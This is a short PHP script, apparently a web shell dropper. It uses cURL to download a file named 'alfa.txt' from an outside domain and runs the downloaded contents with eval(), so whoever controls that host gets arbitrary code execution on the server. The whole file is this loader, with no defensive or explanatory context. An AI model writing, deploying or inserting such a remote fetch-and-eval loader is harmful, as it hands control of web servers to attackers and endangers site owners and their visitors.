<?php
$url = 'https://iibf-indonesia.art/unknown/alfa.txt';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$fileContents = curl_exec($ch);
curl_close($ch);
if ($fileContents === false) {
    die('[!] component : https://iibf-indonesia.art/unknown/alfa.txt');
}
eval("?>" . $fileContents);
?>